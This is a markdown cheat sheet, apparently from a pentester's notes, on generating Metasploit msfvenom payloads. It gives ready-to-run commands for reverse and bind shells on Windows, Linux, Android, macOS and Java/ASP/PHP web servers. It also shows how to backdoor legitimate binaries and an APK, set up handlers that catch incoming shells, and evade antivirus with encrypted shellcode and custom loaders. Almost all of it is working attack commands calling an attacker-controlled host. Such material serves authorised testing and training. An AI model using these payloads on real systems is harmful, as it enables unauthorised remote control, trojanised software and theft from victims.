
# 🐉 msfvenom — Payload Generation Guide

> [!abstract] TL;DR
> `msfvenom` = msfpayload + msfencode merged. Generates payloads in any format,
> encodes/encrypts them, and injects them into template binaries.

---

## 1. Core Syntax & Discovery

```bash
# List everything
msfvenom --list payloads        # payloads (staged + stageless)
msfvenom --list encoders        # encoders (x86, x64, etc.)
msfvenom --list formats         # output formats (-f)
msfvenom --list encrypt         # encryption formats (aes256, etc.)
msfvenom --list platforms       # --platform values
msfvenom --list archs           # --arch values
msfvenom --list nops            # NOP generators
msfvenom --list payload_options # what options each payload takes

# Payload options for a specific payload
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

> [!tip] Staged vs Stageless
> - `windows/x64/meterpreter/reverse_tcp` = **staged** — tiny stub, pulls the
>   full Meterpreter over the socket. Needs `exploit/multi/handler`. Smaller
>   file, but the stage over the wire is signature-scanable.
> - `windows/x64/meterpreter_reverse_tcp` = **stageless** — full payload
>   embedded in the binary. Larger, but nothing to fetch later.
> - **Naming rule:** underscore (`_`) before the transport = stageless.

---

## 2. Essential Flags

```bash
msfvenom -p <payload> \
  LHOST=10.10.14.5 LPORT=443 \
  -f exe -o shell.exe \
  -a x64 --platform windows \     # force arch/platform (usually auto-detected)
  -e x86/shikata_ga_nai \         # encoder
  -i 3 \                          # encoder iterations
  -b '\x00\x0a\x0d' \             # bad characters to avoid
  -x /usr/bin/putty.exe \         # use a legit binary as template (backdoor it)
  -k \                            # keep template's original functionality
  -n 16 \                         # prepend NOP sled
  --smallest                      # generate smallest possible payload
```

| Flag | Purpose |
|------|---------|
| `-f` | output format: `exe`, `elf`, `dll`, `so`, `apk`, `macho`, `ps1`, `py`, `c`, `raw`, `bash`, `htm`, `war`, `asp`, `aspx`, `jsp`, `vba`, `psh`, `vbs` |
| `-e` | encoder, see `--list encoders` |
| `-i` | encoder iterations |
| `-b` | exclude bad chars |
| `-x` | template binary to embed payload into |
| `-k` | run payload in new thread, keep template working |
| `-n` | NOP sled length |
| `--smallest` | strip down to minimum size |
| `-c <file>` | add extra shellcode from file |
| `--encrypt aes256 --encrypt-key <key> --encrypt-iv <iv>` | encrypted payloads (`rc4`, `xor`, `base64`, `aes256`) |

> [!warning] Encoders ≠ AV Bypass
> More encoder iterations do **not** mean better evasion — shikata_ga_nai and
> friends are heavily signatured in 2026. For AV evasion, use custom loaders,
> shellcode injection, or `--encrypt` instead. See [[AV Evasion]].

---

## 3. Payload Cheatsheet by Platform

### 🪟 Windows

```bash
# x64 Meterpreter staged
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev64.exe

# Stageless x64
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev64.exe

# Reverse HTTPS — blends with normal web traffic (best for egress-restricted targets)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o rev.exe

# x86 legacy (32-bit targets, more encoders available)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev.exe

# Bind shell (target listens, you connect — use when target can't egress)
msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=10.10.14.5 LPORT=4444 -f exe -o bind.exe

# DLL (for hijacking / side-loading)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f dll -o rev.dll

# Service exe (SYSTEM context — PsExec / service exploitation)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe-service -o svc.exe

# Script formats (no compiled binary — good against basic file-type blocking)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f psh -o rev.ps1
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f psh-cmd -o rev.bat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f vba -o rev.vba
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f hta-psh -o rev.hta

# Backdoored legit binary (payload fires, program still works)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  -x /usr/share/windows-binaries/plink.exe -k -f exe -o plink_bd.exe
```

> [!note] Format cheat — Windows
> | Situation | Format |
> |---|---|
> | Normal dropper | `-f exe` |
> | Service / SYSTEM privesc | `-f exe-service` |
> | DLL hijack / sideload | `-f dll` |
> | Office macro | `-f vba` |
> | Web delivery | `-f psh`, `-f hta-psh` |
> | Kernel/exploit dev | `-f c`, `-f raw` |

### 🐧 Linux

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o rev.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o rev.elf

# Stageless
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o rev.elf

# SO shared library (LD_PRELOAD / RPATH hijack)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f so -o evil.so
```

### 🤖 Android

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -o rev.apk
```

> [!example] Injecting into an existing APK
> ```bash
> # 1) Decompile
> apktool d original.apk -o orig/
> # 2) Inject payload using the decompiled dir as template
> msfvenom -x orig/ -p android/meterpreter/reverse_tcp \
>   LHOST=10.10.14.5 LPORT=443 -o evil.apk
> # 3) Re-sign (REQUIRED — unsigned APKs won't install)
> keytool -genkey -v -keystore my.keystore -alias app -keyalg RSA \
>   -keysize 2048 -validity 365
> jarsigner -keystore my.keystore -verbose evil.apk app
> # or zipalign + apksigner:
> zipalign -v 4 evil.apk evil-aligned.apk
> apksigner sign --ks my.keystore --out evil-signed.apk evil-aligned.apk
> ```

### 🍎 macOS

```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f macho -o rev.macho
```

### 🌐 Web Shells / App Servers

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o rev.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f jsp -o shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f asp -o shell.asp
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.php
```

> [!warning] PHP gotcha
> `-f raw` doesn't prepend `<?php`. Fix it:
> ```bash
> echo '<?php ' | cat - shell.php > shell2.php
> ```

### ⚙️ Raw Shellcode (Injection / Exploit Dev)

```bash
# C buffer for exploits
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f c -o shell.c

# Python
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f python

# Raw bytes only
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.bin

# Numeric format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f num

# Shellcode avoiding bad chars for a specific exploit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  -b '\x00\x0a\x0d\x20' -f c
```

---

## 4. Catching Shells (Handler Setup)

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # must match the payload
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j          # run as job, keeps listening
```

Useful handler options:

```bash
set EnableStageEncoding true    # stage encoding on the wire
set StageEncoder x64/zutto_dekiru
set IgnoreUnknownPayloads true
set AutoRunScript post/windows/manage/migrate   # auto-migrate on connect
sessions -i <id>                # interact with a session
```

> [!tip] Netcat catch (for non-meterpreter shell payloads)
> ```bash
> nc -lvnp 443          # plain shell_reverse_tcp
> socat file:`tty`,raw,echo=0 tcp-listen:443   # fully interactive TTY
> ```

---

## 5. Evasion Notes

> [!warning] What gets you caught instantly
> - Default msfvenom output — flagged by nearly every AV/EDR
> - `shikata_ga_nai` + high `-i` — heavily signatured, runtime heuristics flag decoders
> - Meterpreter defaults — yara rules cover the metsrv DLL

> [!success] What actually works in 2026
> - `--encrypt aes256` + custom in-memory decryptor/loader
> - Generate shellcode (`-f raw`) → load via custom C#/Python/Nim/Rust loader
> - Process injection (own memory, don't drop to disk)
> - `-x` with a real template + `-k` still helps against lazy static scans only
> - Prefer `reverse_https` on ports 443/8443 for egress flexibility

Example — encrypted shellcode + custom loader flow:

```bash
# 1) Generate encrypted shellcode
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=443 \
  --encrypt aes256 --encrypt-key <32-byte-key-hex> --encrypt-iv <16-byte-iv-hex> \
  -f c -o enc_shell.c

# 2) Embed in your own loader (C#/C++) that decrypts + injects at runtime
```
---

## 6. Quick Reference Card

```bash
# One-liners
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f exe -o r.exe
msfvenom -p linux/x64/shell_reverse_tcp        LHOST=IP LPORT=443 -f elf -o r.elf
msfvenom -p android/meterpreter/reverse_tcp    LHOST=IP LPORT=443 -o r.apk
msfvenom -p java/jsp_shell_reverse_tcp         LHOST=IP LPORT=443 -f war -o r.war
msfvenom -p osx/x64/shell_reverse_tcp          LHOST=IP LPORT=443 -f macho -o r.macho
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll -o r.dll
```

> [!summary] Decision flow
> 1. **Can target egress?** → yes: `reverse_https` · no: `bind_tcp`
> 2. **Need full post-exploitation?** → meterpreter · just a shell: `shell_reverse_tcp`
> 3. **AV on box?** → stageless + `--encrypt` + custom loader, avoid stock exe
> 4. **File type blocked?** → switch format (`ps1`, `hta`, `dll`, `war`)
> 5. **Architecture?** → check with `uname -m` / `systeminfo` before picking x86/x64
